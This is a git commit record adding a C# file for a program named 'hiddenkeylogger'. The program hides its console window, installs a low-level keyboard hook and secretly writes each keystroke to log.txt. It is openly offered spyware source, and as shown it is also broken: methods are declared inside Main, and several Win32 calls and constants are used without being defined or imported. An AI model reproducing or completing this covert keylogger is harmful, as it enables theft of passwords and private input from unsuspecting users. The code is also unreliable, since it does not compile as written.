99ac3234632f8c3fa06cb1ef29ff67fef9830d9a
Nathan C <32592701+awakedev@users.noreply.github.com>
2019-03-18 16:00:19 +0000

    Initial commit

---
+++ Program.cs
@@ -0,0 +1,46 @@
+﻿using System;
+using System.Diagnostics;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.IO;
+
+namespace hiddenkeylogger
+{
+    class Program
+    {
+private const int WH_KEYBOARD_LL = 13;
+private const int WM_KEYDOWN = 0x0100;
+private static LowLevelKeyboardProc _proc = HookCallback;
+private static IntPtr _hookID = IntPtr.Zero;
+
+        static void Main(string[] args)
+        {
+        
+		var handle = GetConsoleWindow();
+
+        // Hide
+        ShowWindow(handle, SW_HIDE);
+
+        _hookID = SetHook(_proc);
+        Application.Run();
+        UnhookWindowsHookEx(_hookID);
+		
+		   private delegate IntPtr LowLevelKeyboardProc(
+        int nCode, IntPtr wParam, IntPtr lParam);
+
+    private static IntPtr HookCallback(
+        int nCode, IntPtr wParam, IntPtr lParam)
+    {
+        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+        {
+            int vkCode = Marshal.ReadInt32(lParam);
+            Console.WriteLine((Keys)vkCode);
+            StreamWriter sw = new StreamWriter(Application.StartupPath+ @"\log.txt",true);
+            sw.Write((Keys)vkCode);
+            sw.Close();
+        }
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+    }
+        }
+    }
+}
